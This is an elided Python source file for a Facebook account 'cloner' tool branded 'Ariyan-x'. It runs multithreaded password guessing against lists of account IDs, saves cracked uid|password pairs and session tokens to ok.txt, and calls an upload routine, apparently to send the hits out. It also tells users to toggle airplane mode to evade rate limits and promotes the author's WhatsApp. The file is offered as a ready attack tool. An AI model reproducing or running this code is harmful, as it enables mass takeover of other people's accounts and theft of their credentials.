...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WATSAPPP🤲https:wa.me/±8801706200853")
	subprocess.check_output(["am", "start", "https://wa.me/±8801706200853"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/ariyanamhed404/ador123-approval.txt/blob/main/ador333-approval.txt').text
			if basesplit in plr:
				key = basesplit
...
┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR  
    Ariyan 404\033[1;32m[ARIYAN]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m ARIYAN404\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  01706200853        │
\033[1;36m│ [✓] ARIYA  : \x1b[1;32mPRO PRONOY\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [Ariyan] [SHUVO]\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %sAriyan-x❌ PROO CLONER❌"%(G,R,G,B,G))
		...
		print(GET)
		os.system('https://www.facebook.com/next.crush.Jati')
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK ARIYAN-X 707-> ok.txt"%(G))
				print("%s [+] CP ARIYAN-X 707-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def old4_7(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK ARIYAN-X 707-> ok.txt"%(G))
				print("%s [+] CP ARIYAN-X 707-> cp.txt"%(R))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK ARIYAN -X-> ok.txt"%(G))
				print("%s [+] CP ARIYAN-X-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def old_11(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK ARIYAN-X707-> ok.txt"%(G))
				print("%s [+] CP ARIYAN-X707-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK ARIYAN-> ok.txt"%(G))
				print("%s [+] CP ARIYAN-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Ariyan] : %s/%s -> \033[0;92m [ ARIYAN-OK:%s ]- \033[0;91m[ARIYAN😔-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [ARIYAN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[ARIYAN😔-CP] %s|%s\033[0;97m         "%(uid, pw))
